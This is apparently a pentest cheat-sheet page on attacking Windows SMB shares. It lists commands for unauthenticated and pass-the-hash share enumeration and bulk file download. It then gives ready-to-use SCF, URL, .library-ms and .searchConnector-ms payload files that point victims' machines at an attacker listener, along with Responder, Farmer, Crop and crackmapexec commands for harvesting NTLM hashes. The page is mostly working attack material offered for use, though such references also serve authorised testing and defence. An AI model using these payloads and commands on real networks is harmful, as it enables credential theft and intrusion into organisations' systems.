# Shares

## READ Permission

> Some shares can be accessible without authentication, explore them to find some juicy files

* [ShawnDEvans/smbmap - a handy SMB enumeration tool](https://github.com/ShawnDEvans/smbmap)
  ```powershell
  smbmap -H 10.10.10.10                # null session
  smbmap -H 10.10.10.10 -R             # recursive listing
  smbmap -H 10.10.10.10 -u invaliduser # guest smb session
  smbmap -H 10.10.10.10 -d "DOMAIN.LOCAL" -u "USERNAME" -p "Password123*"
  ```

* [byt3bl33d3r/pth-smbclient from path-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
  ```powershell
  pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/Share
  pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/C$
  ls  # list files
  cd  # move inside a folder
  get # download files
  put # replace a file
  ```

* [SecureAuthCorp/smbclient from Impacket](https://github.com/SecureAuthCorp/impacket)
  ```powershell
  smbclient -I 10.10.10.100 -L ACTIVE -N -U ""
          Sharename       Type      Comment
          ---------       ----      -------
          ADMIN$          Disk      Remote Admin
          C$              Disk      Default share
          IPC$            IPC       Remote IPC
          NETLOGON        Disk      Logon server share
          Replication     Disk      
          SYSVOL          Disk      Logon server share
          Users           Disk
  use Sharename # select a Sharename
  cd Folder     # move inside a folder
  ls            # list files
  ```

* [smbclient - from Samba, ftp-like client to access SMB/CIFS resources on servers](#)
  ```powershell
  smbclient -U username //10.0.0.1/SYSVOL
  smbclient //10.0.0.1/Share

  # Download a folder recursively
  smb: \> mask ""
  smb: \> recurse ON
  smb: \> prompt OFF
  smb: \> lcd '/path/to/go/'
  smb: \> mget *
  ```


* [SnaffCon/Snaffler - a tool for pentesters to help find delicious candy](https://github.com/SnaffCon/Snaffler)
  ```ps1
  snaffler.exe -s - snaffler.log

  # Snaffle all the computers in the domain
  ./Snaffler.exe -d domain.local -c <DC> -s

  # Snaffle specific computers
  ./Snaffler.exe -n computer1,computer2 -s
  ​
  # Snaffle a specific directory
  ./Snaffler.exe -i C:\ -s
  ```


## WRITE Permission

Write SCF and URL files on a writeable share to farm for user's hashes and eventually replay them.

Theses attacks can be automated with [Farmer.exe](https://github.com/mdsecactivebreach/Farmer) and [Crop.exe](https://github.com/mdsecactivebreach/Farmer/tree/main/crop)

```ps1
# Farmer to receive auth
farmer.exe <port> [seconds] [output]
farmer.exe 8888 0 c:\windows\temp\test.tmp # undefinitely
farmer.exe 8888 60 # one minute

# Crop can be used to create various file types that will trigger SMB/WebDAV connections for poisoning file shares during hash collection attacks
crop.exe <output folder> <output filename> <WebDAV server> <LNK value> [options]
Crop.exe \\\\fileserver\\common mdsec.url \\\\workstation@8888\\mdsec.ico
Crop.exe \\\\fileserver\\common mdsec.library-ms \\\\workstation@8888\\mdsec
```

### SCF Files

Drop the following `@something.scf` file inside a share and start listening with Responder : `responder -wrf --lm -v -I eth0`

```powershell
[Shell]
Command=2
IconFile=\\10.10.10.10\Share\test.ico
[Taskbar]
Command=ToggleDesktop
```

Using [`crackmapexec`](https://github.com/mpgn/CrackMapExec/blob/master/cme/modules/slinky.py):

```ps1
crackmapexec smb 10.10.10.10 -u username -p password -M scuffy -o NAME=WORK SERVER=IP_RESPONDER #scf
crackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER #lnk
crackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER CLEANUP
```

### URL Files

This attack also works with `.url` files and `responder -I eth0 -v`.

```powershell
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\10.10.10.10\%USERNAME%.icon
IconIndex=1
```

### Windows Library Files 

> Windows Library Files (.library-ms)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="<http://schemas.microsoft.com/windows/2009/library>">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>\\\\workstation@8888\\folder</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

### Windows Search Connectors Files

> Windows Search Connectors (.searchConnector-ms)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="<http://schemas.microsoft.com/windows/2009/searchConnector>">
    <iconReference>imageres.dll,-1002</iconReference>
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <iconReference>\\\\workstation@8888\\folder.ico</iconReference>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>\\\\workstation@8888\\folder</url>
    </simpleLocation>
</searchConnectorDescription>
```